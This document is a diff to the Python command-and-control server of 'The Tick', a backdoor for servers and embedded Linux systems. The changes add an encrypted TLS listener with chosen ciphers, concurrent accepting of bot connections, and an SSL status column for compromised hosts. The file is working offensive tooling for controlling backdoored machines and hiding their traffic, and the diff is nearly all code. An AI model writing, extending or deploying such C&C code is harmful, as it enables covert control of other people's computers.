@@ -26,10 +26,12 @@ import sys
 import readline
 import os
 import os.path
+import ssl
 
 # More standard imports...
 from socket import *
 from struct import *
+from select import select
 from cmd import Cmd
 from shlex import split
 from threading import Thread, RLock
@@ -106,11 +108,11 @@ except AssertionError:
 
 # Boring banner :(
 BORING_BANNER = """
-ICAbWzMybRtbMW3ilZTilabilZcbWzIybeKUrCDilKzilIzilIDilJAgIBtbMW3ilZTilabilZcb
-WzIybeKUrOKUjOKUgOKUkOKUrOKUjOKUgBtbMG0KICAbWzMybRtbMW0g4pWRIBtbMjJt4pSc4pSA
-4pSk4pSc4pSkICAgG1sxbSDilZEgG1syMm3ilILilIIgIOKUnOKUtOKUkBtbMG0KICAbWzMybRtb
-MW0g4pWpIBtbMjJt4pS0IOKUtOKUlOKUgOKUmCAgG1sxbSDilakgG1syMm3ilLTilJTilIDilJji
-lLQg4pS0G1swbQo=
+G1szMm0bWzFt4pWU4pWm4pWXG1syMm3ilKwg4pSs4pSM4pSA4pSQICAbWzFt4pWU4pWm4pWXG1sy
+Mm3ilKzilIzilIDilJDilKzilIzilIAbWzBtChtbMzJtG1sxbSDilZEgG1syMm3ilJzilIDilKTi
+lJzilKQgICAbWzFtIOKVkSAbWzIybeKUguKUgiAg4pSc4pS04pSQG1swbQobWzMybRtbMW0g4pWp
+IBtbMjJt4pS0IOKUtOKUlOKUgOKUmCAgG1sxbSDilakgG1syMm3ilLTilJTilIDilJjilLQg4pS0
+G1swbQo=
 """.decode("base64")
 
 # Fun banner :)
@@ -396,7 +398,40 @@ def copy_stream(src, dst, count):
 class Listener(Thread):
     "Listener C&C for The Tick bots."
 
-    def __init__(self, callback, bind_addr = "0.0.0.0", port = 5555):
+    # Supported ciphers in order of preference.
+    CIPHERS = [
+        'ECDHE-RSA-AES128-GCM-SHA256',
+        'ECDHE-ECDSA-AES128-GCM-SHA256',
+        'ECDHE-RSA-AES256-GCM-SHA384',
+        'ECDHE-ECDSA-AES256-GCM-SHA384',
+        'DHE-RSA-AES128-GCM-SHA256',
+        'DHE-DSS-AES128-GCM-SHA256',
+        'kEDH+AESGCM',
+        'ECDHE-RSA-AES128-SHA256',
+        'ECDHE-ECDSA-AES128-SHA256',
+        'ECDHE-RSA-AES128-SHA',
+        'ECDHE-ECDSA-AES128-SHA',
+        'ECDHE-RSA-AES256-SHA384',
+        'ECDHE-ECDSA-AES256-SHA384',
+        'ECDHE-RSA-AES256-SHA',
+        'ECDHE-ECDSA-AES256-SHA',
+        'DHE-RSA-AES128-SHA256',
+        'DHE-RSA-AES128-SHA',
+        'DHE-DSS-AES128-SHA256',
+        'DHE-RSA-AES256-SHA256',
+        'DHE-DSS-AES256-SHA',
+        'DHE-RSA-AES256-SHA',
+        '!aNULL',
+        '!eNULL',
+        '!EXPORT',
+        '!DES',
+        '!RC4',
+        '!3DES',
+        '!MD5',
+        '!PSK'
+    ]
+
+    def __init__(self, callback, bind_addr = "0.0.0.0", port = 5555, ssl_port = 6666, keyfile = None, certfile = None):
 
         # True when running, False when shutting down.
         self.alive = False
@@ -406,12 +441,18 @@ class Listener(Thread):
         # itself and the bot that just connected.
         self.callback = callback
 
-        # Bind address and port.
+        # Bind address and ports.
         self.bind_addr = bind_addr
         self.port = port
+        self.ssl_port = ssl_port
 
-        # Listening socket.
+        # Listening sockets.
         self.listen_sock = None
+        self.ssl_listen_sock = None
+
+        # SSL configuration.
+        self.keyfile = keyfile
+        self.certfile = certfile
 
         # Ordered dictionary with the bots that connected.
         # It will become apparent why we're using an ordered dict
@@ -433,6 +474,11 @@ class Listener(Thread):
         self.listen_sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
         self.listen_sock.bind((self.bind_addr, self.port))
         self.listen_sock.listen(5)
+        if self.keyfile and self.certfile:
+            self.ssl_listen_sock = socket()
+            self.ssl_listen_sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+            self.ssl_listen_sock.bind((self.bind_addr, self.ssl_port))
+            self.ssl_listen_sock.listen(5)
         return self
 
     # Context manager to ensure all the sockets are closed on exit,
@@ -440,24 +486,37 @@ class Listener(Thread):
     # is cleared.
     def __exit__(self, *args):
         self.alive = False
-        try:
-            self.listen_sock.shutdown(2)
-        except Exception:
-            pass
-        try:
-            self.listen_sock.close()
-        except Exception:
-            pass
-        self.listen_sock = None
+        if self.listen_sock is not None:
+            try:
+                self.listen_sock.shutdown(2)
+            except Exception:
+                pass
+            try:
+                self.listen_sock.close()
+            except Exception:
+                pass
+            self.listen_sock = None
+        if self.ssl_listen_sock is not None:
+            try:
+                self.ssl_listen_sock.shutdown(2)
+            except Exception:
+                pass
+            try:
+                self.ssl_listen_sock.close()
+            except Exception:
+                pass
+            self.ssl_listen_sock = None
         for bot in self.bots.values():
-            try:
-                bot.sock.shutdown(2)
-            except Exception:
-                pass
-            try:
-                bot.sock.close()
-            except Exception:
-                pass
+            if bot.sock is not None:
+                try:
+                    bot.sock.shutdown(2)
+                except Exception:
+                    pass
+                try:
+                    bot.sock.close()
+                except Exception:
+                    pass
+                bot.sock = None
         self.bots.clear()
 
     # This method is invoked in a background thread.
@@ -480,11 +539,57 @@ class Listener(Thread):
                     # Accept an incoming bot connection.
                     # This is a blocking call and the background
                     # thread will spend most of the time stuck here.
-                    sock, from_addr = self.listen_sock.accept()
-                    try:
+                    socks = [s for s in (self.listen_sock, self.ssl_listen_sock) if s is not None]
+                    socks, _, _ = select(socks, [], [])
+                    for s in socks:
+                        sock, from_addr = s.accept()
+                        try:
 
-                        # Uh-oh, someone asked us to stop, so quit now.
-                        if not self.alive:
+                            # Uh-oh, someone asked us to stop, so quit now.
+                            if not self.alive:
+                                try:
+                                    sock.shutdown(2)
+                                except Exception:
+                                    pass
+                                try:
+                                    sock.close()
+                                except Exception:
+                                    pass
+                                break
+
+                            # If it's the SSL port, initiate SSL.
+                            if s is self.ssl_listen_sock:
+                                sock = ssl.wrap_socket(sock,
+                                    server_side = True,
+                                    ssl_version = ssl.PROTOCOL_TLSv1_2,
+                                    do_handshake_on_connect = True,
+                                    keyfile = self.keyfile,
+                                    certfile = self.certfile,
+                                    ciphers = ':'.join(self.CIPHERS)
+                                )
+
+                            # The first 16 bytes that come from the socket
+                            # must be the bot UUID value. This value is
+                            # generated randomly by the bot when starting up.
+                            # It DOES NOT identify the target machine, but
+                            # rather the bot instance, so multiple instances
+                            # on the same machine will have different UUIDs.
+                            uuid = recvall(sock, 16)
+                            if len(uuid) != 16:
+                                continue
+                            uuid = str(UUID(bytes = uuid))
+
+                            # Instance a Bot object for this new connection.
+                            bot = Bot(sock, uuid, from_addr)
+
+                            # Keep it in the ordered dictionary. This means
+                            # the dictionary will remember the order in which
+                            # the bots connected. This is useful for the Console
+                            # class later on.
+                            self.bots[uuid] = bot
+
+                        # On error make sure to destroy the accepted socket.
+                        except:
                             try:
                                 sock.shutdown(2)
                             except Exception:
@@ -493,51 +598,19 @@ class Listener(Thread):
                                 sock.close()
                             except Exception:
                                 pass
-                            break
+                            raise
 
-                        # The first 16 bytes that come from the socket
-                        # must be the bot UUID value. This value is
-                        # generated randomly by the bot when starting up.
-                        # It DOES NOT identify the target machine, but
-                        # rather the bot instance, so multiple instances
-                        # on the same machine will have different UUIDs.
-                        uuid = recvall(sock, 16)
-                        if len(uuid) != 16:
-                            continue
-                        uuid = str(UUID(bytes = uuid))
-
-                        # Instance a Bot object for this new connection.
-                        bot = Bot(sock, uuid, from_addr)
-
-                        # Keep it in the ordered dictionary. This means
-                        # the dictionary will remember the order in which
-                        # the bots connected. This is useful for the Console
-                        # class later on.
-                        self.bots[uuid] = bot
-
-                    # On error make sure to destroy the accepted socket.
-                    except:
+                        # Invoke the callback function to notify
+                        # a new bot has connected to the C&C.
                         try:
-                            sock.shutdown(2)
+                            self.callback(self, bot)
                         except Exception:
-                            pass
-                        try:
-                            sock.close()
-                        except Exception:
-                            pass
-                        raise
+                            print_exc()
 
-                    # Invoke the callback function to notify
-                    # a new bot has connected to the C&C.
-                    try:
-                        self.callback(self, bot)
-                    except Exception:
-                        print_exc()
-
-                # Print exceptions and continue running.
-                # TODO maybe use the console notifications for this?
+                # Ignore exceptions and continue running.
                 except Exception:
-                    print_exc()
+                    ##print_exc()   ## XXX DEBUG
+                    pass
 
     # The accept() call is a bit particular in Python,
     # we can't just close the socket and call it a day.
@@ -610,6 +683,9 @@ class Bot(object):
 
         # The C&C socket to talk to this bot.
         self.sock = sock
+
+        # True if the bot is connected over SSL, False otherwise.
+        self.encrypted = isinstance(sock, ssl.SSLSocket)
 
         # The UUID for this bot instance.
         # See Listener.run() for more details.
@@ -1165,7 +1241,7 @@ class Console(Cmd):
         # All the supported command line switches go here.
         parser = ArgumentParser(formatter_class=ColorHelpFormatter,
                 prog=Fore.GREEN+Style.BRIGHT+os.path.basename(sys.argv[0])+Style.RESET_ALL,
-                description="Embedded Linux Backdoor by Mario Vilas")
+                description="A simple backdoor for servers and embedded systems.")
         parser.add_argument("--version", action="version",
                 version="The Tick, by Mario Vilas, version " + Fore.YELLOW + "0.1" + Style.RESET_ALL)
         parser.add_argument("-b", "--bind", dest="bind_addr", default="0.0.0.0",
@@ -1174,6 +1250,15 @@ class Console(Cmd):
         parser.add_argument("-p", "--port", type=int, default=5555,
                 metavar=Fore.BLUE+Style.BRIGHT+"PORT"+Style.RESET_ALL,
                 help="Port to bind the TCP listener to [default: "+Fore.YELLOW+"5555"+Style.RESET_ALL+"]")
+        parser.add_argument("-s", "--ssl", type=int, default=6666, dest="ssl_port",
+                metavar=Fore.BLUE+Style.BRIGHT+"PORT"+Style.RESET_ALL,
+                help="Port to bind the SSL listener to [default: "+Fore.YELLOW+"6666"+Style.RESET_ALL+"]")
+        parser.add_argument("-k", "--keyfile",
+                metavar=Fore.BLUE+Style.BRIGHT+"FILE"+Style.RESET_ALL,
+                help="SSL keyfile (required to enable SSL)")
+        parser.add_argument("-c", "--certfile",
+                metavar=Fore.BLUE+Style.BRIGHT+"FILE"+Style.RESET_ALL,
+                help="SSL certfile (required to enable SSL)")
         parser.add_argument("--no-color", action="store_true", default=False,
                 help=("Disable the use of ANSI escape sequences (i.e. pretty "+
                 Fore.RED+"c"+Style.BRIGHT+"o"+Fore.YELLOW+"l"+Fore.GREEN+"o"+Fore.BLUE+"r"+Fore.MAGENTA+"s"+Style.RESET_ALL+
@@ -1191,6 +1276,7 @@ class Console(Cmd):
             elif width < 80: width = 80
             os.environ["COLUMNS"] = str(width)
         except Exception:
+            ##raise  # XXX DEBUG
             pass
 
         # Parse the command line arguments.
@@ -1207,7 +1293,14 @@ class Console(Cmd):
     def __enter__(self):
 
         # Fire up the TCP C&C listener.
-        self.listener = Listener(self.notify_new_bot, self.args.bind_addr, self.args.port)
+        self.listener = Listener(
+            callback = self.notify_new_bot,
+            bind_addr = self.args.bind_addr,
+            port = self.args.port,
+            ssl_port = self.args.ssl_port,
+            keyfile = self.args.keyfile,
+            certfile = self.args.certfile,
+        )
         self.listener.start()
 
         # Comply with the context managers protocol.
@@ -1337,26 +1430,18 @@ class Console(Cmd):
     # This property generates the banner.
     @property
     def intro(self):
-
         # Prepare the dynamic part of the banner.
-        listening_on = ("Listening on: %s:%d" % (self.listener.bind_addr, self.listener.port))
+        if self.listener.keyfile and self.listener.certfile:
+            listening_on = ("Listening on: %s:%d (plaintext), %s:%d (SSL)" % (self.listener.bind_addr, self.listener.port, self.listener.bind_addr, self.listener.ssl_port))
+        else:
+            listening_on = ("Listening on: %s:%d (plaintext)" % (self.listener.bind_addr, self.listener.port))
 
         # Boring banner :(
         if self.use_boring_banner:
-            return (
-                BORING_BANNER +
-                " Embedded Linux Backdoor\nby Mario Vilas\n\n" +
-                Fore.GREEN + listening_on + Style.RESET_ALL
-            )
+            return BORING_BANNER + Fore.GREEN + listening_on + Style.RESET_ALL
 
         # Fun banner :)
-        return (
-            FUN_BANNER +
-            Style.BRIGHT +
-            "                Embedded Linux Backdoor\n" + Style.NORMAL +
-            "                    by Mario Vilas\n\n" +
-            Fore.GREEN + listening_on + Style.RESET_ALL
-        )
+        return FUN_BANNER + Style.BRIGHT + Fore.GREEN + listening_on + Style.RESET_ALL
 
     # This property generates the command prompt.
     @property
@@ -1391,6 +1476,15 @@ class Console(Cmd):
             if x.uuid == uuid:
                 return True
         return False
+
+    # Helper function to tell if a bot is connected over SSL.
+    # If no bot is given, the currently selected bot is tested.
+    def is_bot_encrypted(self, bot = None):
+        if bot is None:
+            bot = self.current
+            if bot is None:
+                return False
+        return bot.encrypted
 
     #
     # The implementation for each command follows.
@@ -1484,14 +1578,15 @@ class Console(Cmd):
         # dirty trick instead with placeholder characters.
         table = Texttable()
         table.set_deco(Texttable.HEADER)
-        table.set_cols_dtype(("i", "t", "t", "t"))
-        table.set_cols_align(("l", "c", "c", "c"))
-        table.set_cols_valign(("t", "t", "t", "t"))
-        table.set_cols_width((len(str(len(self.listener.bots))), 38, 17, 6))
-        table.add_rows((("#", "UUID", "IP address", "Status"),), header = True)
+        table.set_cols_dtype(("i", "t", "t", "t", "t"))
+        table.set_cols_align(("l", "c", "c", "c", "c"))
+        table.set_cols_valign(("t", "t", "t", "t", "t"))
+        table.set_cols_width((len(str(len(self.listener.bots))), 38, 17, 5, 6))
+        table.add_rows((("#", "UUID", "IP address", "SSL", "Status"),), header = True)
         i = 0
         for bot in self.listener.bots.values():
             busy = self.is_bot_busy(bot)
+            ssl = "\x03yes\x04" if self.is_bot_encrypted(bot) else "\x01no\x04"
             status = "\x01gone\x04"
             if bot.alive:
                 status = "\x03live\x04"
@@ -1501,6 +1596,7 @@ class Console(Cmd):
                 i,
                 bot.uuid,
                 "\x02" + bot.from_addr[0] + "\x04",
+                ssl,
                 status
             ))
             i += 1
@@ -1928,7 +2024,7 @@ class Console(Cmd):
 
                     # Try to re-select the same bot when exiting the shell.
                     # We need to do this because the pivot reuses the C&C socket,
-                    # so the bot mut reconnect in the background with a new socket.
+                    # so the bot must reconnect in the background with a new socket.
                     sleep(0.1)
                     self.current = self.listener.bots.get(uuid, None)
 
